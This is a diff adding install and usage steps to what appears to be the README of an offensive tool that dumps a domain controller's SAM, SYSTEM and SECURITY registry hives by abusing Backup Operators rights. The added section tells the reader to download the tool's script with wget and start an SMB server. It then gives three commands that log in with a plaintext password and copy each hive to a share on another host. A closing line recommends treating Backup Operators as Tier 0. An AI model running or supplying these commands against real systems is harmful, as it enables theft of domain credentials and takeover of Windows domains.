@@ -19,5 +19,24 @@ Dumping SECURITY hive to \\10.0.220.51\share\SECURITY
 
 ![Proof](backup_dc_hive.png)
 
+## Install
+To prevent the reg.py file from impacket being overwritten with a new reg.py file, you can save it with another name
+```
+wget https://raw.githubusercontent.com/zief/backup_dc_registry/main/reg.py -O regi.py
+```
+
+## Individual backup
+Fire up your smbserver to receive backup file.
+```
+smbserver.py -smb2support myshare .
+```
+
+```
+python regi.py zief:'Ayeaye2023!'@192.168.212.16 backupsam -p '\\192.168.210.12\myshare'
+python regi.py zief:'Ayeaye2023!'@192.168.212.16 backupsystem -p '\\192.168.210.12\myshare'
+python regi.py zief:'Ayeaye2023!'@192.168.212.16 backupsecurity -p '\\192.168.210.12\myshare'
+```
+
+
 ## Remediation:
 Treat `Backup Operators` domain group as Domain Adminstrators and other Tier 0 resources 
